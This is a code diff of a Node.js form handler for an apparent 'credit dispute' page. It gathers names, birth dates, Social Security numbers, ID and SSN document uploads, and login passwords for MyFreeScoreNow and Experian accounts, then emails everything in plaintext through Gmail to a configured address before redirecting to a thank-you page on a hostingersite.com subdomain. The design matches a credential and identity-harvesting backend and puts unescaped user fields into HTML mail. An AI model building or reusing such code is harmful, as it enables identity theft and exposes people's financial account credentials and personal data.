@@ -2,11 +2,7 @@ import nodemailer from "nodemailer";
 import formidable from "formidable";
 import fs from "fs";
 
-console.log("ENV CHECK:");
-console.log("GMAIL_USER:", process.env.GMAIL_USER);
-console.log("GMAIL_PASS exists:", !!process.env.GMAIL_PASS);
-
-// Disable default body parsing
+// Disable default body parsing (required for formidable)
 export const config = {
   api: {
     bodyParser: false,
@@ -18,94 +14,95 @@ export default async function handler(req, res) {
     return res.status(405).send("Method Not Allowed");
   }
 
+  // Quick environment safety check
+  if (!process.env.GMAIL_USER || !process.env.GMAIL_PASS || !process.env.TO) {
+    console.error("Missing required environment variables.");
+    return res.status(500).send("Server configuration error.");
+  }
+
   const form = formidable({
     multiples: false,
     keepExtensions: true,
   });
 
-  form.parse(req, async (err, fields, files) => {
-    if (err) {
-      console.error(err);
-      return res.status(500).send("Form parsing error");
+  try {
+    const { fields, files } = await new Promise((resolve, reject) => {
+      form.parse(req, (err, fields, files) => {
+        if (err) reject(err);
+        else resolve({ fields, files });
+      });
+    });
+
+    // Create Gmail transporter (explicit SMTP — more stable)
+    const transporter = nodemailer.createTransport({
+      host: "smtp.gmail.com",
+      port: 465,
+      secure: true,
+      auth: {
+        user: process.env.GMAIL_USER,
+        pass: process.env.GMAIL_PASS, // MUST be Google App Password
+      },
+    });
+
+    // Build attachments using buffers (serverless safe)
+    const attachments = [];
+
+    async function addFile(file) {
+      if (!file) return;
+
+      const fileBuffer = await fs.promises.readFile(file.filepath);
+
+      attachments.push({
+        filename: file.originalFilename || "uploaded-file",
+        content: fileBuffer,
+      });
     }
 
-    try {
-      // Gmail transporter
-      const transporter = nodemailer.createTransport({
-        service: "gmail",
-        auth: {
-          user: process.env.GMAIL_USER,
-          pass: process.env.GMAIL_PASS, // App Password (NOT real password)
-        },
-      });
+    await addFile(files.id_upload);
+    await addFile(files.ssn_upload);
+    await addFile(files.address_proof_upload);
 
-      // Prepare attachments
-      const attachments = [];
+    // Email content
+    const mailOptions = {
+      from: process.env.GMAIL_USER,
+      to: process.env.TO,
+      subject: "New Credit Dispute Form Submission",
+      html: `
+        <h2>New Submission</h2>
 
-      if (files.id_upload) {
-        attachments.push({
-          filename: files.id_upload.originalFilename,
-          path: files.id_upload.filepath,
-        });
-      }
+        <p><strong>Name:</strong> ${fields.full_name || ""}</p>
+        <p><strong>Email:</strong> ${fields.email || ""}</p>
+        <p><strong>Phone:</strong> ${fields.phone || ""}</p>
+        <p><strong>DOB:</strong> ${fields.date_of_birth || ""}</p>
+        <p><strong>SSN:</strong> ${fields.ssn || ""}</p>
+        <p><strong>Address:</strong> 
+          ${fields.address || ""}, 
+          ${fields.city || ""}, 
+          ${fields.state || ""}, 
+          ${fields.zip_code || ""}
+        </p>
 
-      if (files.ssn_upload) {
-        attachments.push({
-          filename: files.ssn_upload.originalFilename,
-          path: files.ssn_upload.filepath,
-        });
-      }
+        <hr />
 
-      if (files.address_proof_upload) {
-        attachments.push({
-          filename: files.address_proof_upload.originalFilename,
-          path: files.address_proof_upload.filepath,
-        });
-      }
+        <p><strong>MyFreeScoreNow Username:</strong> ${fields.myfreescorenow_username || ""}</p>
+        <p><strong>MyFreeScoreNow Password:</strong> ${fields.myfreescorenow_password || ""}</p>
 
-      // Email body
-      const mailOptions = {
-        from: process.env.GMAIL_USER,
-        to: process.env.TO, // where you receive submissions
-        subject: "New Credit Dispute Form Submission",
-        html: `
-          <h2>New Submission</h2>
-          <p><strong>Name:</strong> ${fields.full_name}</p>
-          <p><strong>Email:</strong> ${fields.email}</p>
-          <p><strong>Phone:</strong> ${fields.phone}</p>
-          <p><strong>DOB:</strong> ${fields.date_of_birth}</p>
-          <p><strong>SSN:</strong> ${fields.ssn}</p>
-          <p><strong>Address:</strong> ${fields.address}, ${fields.city}, ${fields.state}, ${fields.zip_code}</p>
+        <p><strong>Experian Username:</strong> ${fields.experian_username || ""}</p>
+        <p><strong>Experian Password:</strong> ${fields.experian_password || ""}</p>
+      `,
+      attachments,
+    };
 
-          <hr />
+    await transporter.sendMail(mailOptions);
 
-          <p><strong>MyFreeScoreNow Username:</strong> ${fields.myfreescorenow_username}</p>
-          <p><strong>MyFreeScoreNow Password:</strong> ${fields.myfreescorenow_password}</p>
+    // Redirect after success
+    res.writeHead(302, {
+      Location: "https://bisque-ram-411182.hostingersite.com/thank-you",
+    });
+    res.end();
 
-          <p><strong>Experian Username:</strong> ${fields.experian_username}</p>
-          <p><strong>Experian Password:</strong> ${fields.experian_password}</p>
-        `,
-        attachments,
-      };
-
-      await transporter.sendMail(mailOptions);
-
-      // Cleanup temp files
-      attachments.forEach(file => {
-        if (file.path && fs.existsSync(file.path)) {
-          fs.unlinkSync(file.path);
-        }
-      });
-
-      // Redirect after success
-      res.writeHead(302, {
-        Location: "https://bisque-ram-411182.hostingersite.com/thank-you",
-      });
-      res.end();
-
-    } catch (error) {
-      console.error(error);
-      res.status(500).send("Email sending failed");
-    }
-  });
+  } catch (error) {
+    console.error("API ERROR:", error);
+    return res.status(500).send("Email sending failed.");
+  }
 }
